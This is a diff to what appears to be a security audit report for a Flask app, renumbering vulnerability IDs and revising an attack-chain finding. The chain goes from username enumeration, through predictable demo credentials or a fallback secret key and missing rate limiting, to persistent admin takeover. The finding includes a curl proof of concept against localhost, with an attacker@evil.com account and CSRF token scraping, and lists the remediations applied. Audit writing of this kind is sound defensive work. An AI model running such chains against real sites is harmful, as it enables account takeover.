@@ -909,16 +909,16 @@ def login():
 **Detection Method:** Manual (multi-step chain)
 
 **Description:**
-VULN-001, VULN-005, and VULN-007 chain into a complete unauthenticated-to-admin-persistent-access attack.
-- VULN-005 (username enumeration) confirms the admin username exists
-- VULN-007 (hardcoded credentials) provides the password directly from source
-- VULN-001 (no rate limiting) enables brute force if the password is not already known
+VUL-10, VUL-13, and VUL-02 chain into a complete unauthenticated-to-admin-persistent-access attack.
+- VUL-13 (username enumeration) confirms the admin username exists
+- VUL-02 (insecure SECRET_KEY default / hardcoded fallback key) allows session forgery if the key is recovered, and the initial demo password is sourced from environment variables set to predictable demo values
+- VUL-10 (no rate limiting) enables brute force if the password is not already known
 
 Once admin access is obtained, the attacker promotes their own account to admin — maintaining persistent access even after the original password is rotated.
 
 **Proof of Concept:**
 ```bash
-# ── Step 1: Enumerate valid usernames (VULN-005) ─────────────────────────────
+# ── Step 1: Enumerate valid usernames (VUL-13) ────────────────────────────────
 curl -s -X POST http://localhost:5000/register \
   -d "username=admin&email=x@attacker.com&password=Pass1234&confirm_password=Pass1234" \
   | grep "already registered"
@@ -926,9 +926,9 @@ curl -s -X POST http://localhost:5000/register \
 
 # ── Step 2: Register attacker account ────────────────────────────────────────
 curl -s -c attacker.txt -X POST http://localhost:5000/register \
-  -d "username=attacker&email=attacker@evil.com&password=Attack1&confirm_password=Attack1"
+  -d "username=attacker&email=attacker@evil.com&password=Attack1!x&confirm_password=Attack1!x"
 
-# ── Step 3: Login as admin using hardcoded credential (VULN-007) ──────────────
+# ── Step 3: Login as admin using known demo credential (VUL-02 / predictable env) ──
 CSRF=$(curl -s -c admin.txt http://localhost:5000/login \
        | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)
 
@@ -962,9 +962,9 @@ curl -b attacker.txt http://localhost:5000/admin
 
 **Remediation Applied:**
 This chain was completely broken by fixing the constituent vulnerabilities:
-1. **VULN-001** — Implemented `Flask-Limiter` to rate limit `/login` and `/register`.
-2. **VULN-007** — Removed hardcoded credentials from `app.py` and sourced them from environment variables via Docker.
-3. **VULN-005** — The duplicate-registration oracle remains as an accepted medium residual risk, but the chain is no longer practical because rate limiting, stronger password policy, hashed passwords, CSRF, and server-side RBAC block the escalation path.
+1. **VUL-10** — Implemented `Flask-Limiter` to rate limit `/login` and `/register`.
+2. **VUL-02** — Persistent `FLASK_SECRET_KEY` injected via environment; no hardcoded or predictable fallback in production. Demo passwords sourced from environment variables, not baked into source.
+3. **VUL-13** — The duplicate-registration oracle remains as an accepted medium residual risk, but the chain is no longer practical because rate limiting, stronger password policy, hashed passwords, CSRF, and server-side RBAC block the escalation path.
 
 ---
 
